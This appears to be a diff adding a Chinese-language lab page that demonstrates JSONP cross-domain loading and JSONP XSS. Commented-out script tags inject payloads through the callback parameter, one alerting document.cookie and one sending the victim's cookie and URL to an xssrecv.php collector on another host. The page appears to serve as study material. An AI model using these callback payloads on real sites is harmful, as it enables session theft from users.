@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, install-scale=1.0">
+    <title>List-JSONP</title>
+
+    <!-- 无法跨域 -->
+<!--     <script type="text/javascript">
+        var listUrl = 'http://192.168.31.166/temp/list-json.php';
+//         var listUrl = 'http://192.168.31.238:8080/list-json.php';
+//         var listUrl = 'http://192.168.31.238:8080/dorabox/csrf/jsonp.php?callback=test';
+//         实例化XMLHttpRequest. 用于发送AJAX请求
+        xmlhttp = new XMLHttpRequest();
+        var count = 0;
+//         当请求状态发生变化时，触发执行代码
+        xmlhttp.onreadystatechange=function(){
+            if(xmlhttp.readyState == 4 && xmlhttp.status==200)
+            {
+//                 取得请求的响应，并从响应中正则提取Token
+                var text = xmlhttp.responseText;
+                alert(text);
+            }
+        };
+        xmlhttp.open("GET",listUrl, false);
+        xmlhttp.send();
+    </script> -->
+
+    
+    <!-- JSONP回调实现跨域 -->
+    <script>
+         function jsonp(args){
+//             alert(args);
+//             alert(JSON.stringify(args));
+//             document.write(JSON.stringify(args));
+            setTimeout(function(){alert(JSON.stringify(args));},5000);
+        }
+    </script>
+<!--     <script>test(json)</script> -->
+    <script src="http://192.168.31.166/temp/list-json.php?callback=jsonp"></script>
+    
+    
+    <!-- JSONP的xss漏洞 -->
+<!--     <script src="http://192.168.31.166/temp/list-json.php?callback=alert(document.cookie);//"></script> -->
+<!--     <script src="http://192.168.31.166/temp/list-json.php?callback=location.href='http://192.168.31.238:8080/xssrecv.php?cookie='%2Bdocument.cookie%2B'%26url='%2Blocation.href;//"></script> -->
+    
+    
+    
+</head>
+<body>
+    跨页面查看JSON数据，只要是同意，则完全没有问题。
+</body>
+</html>
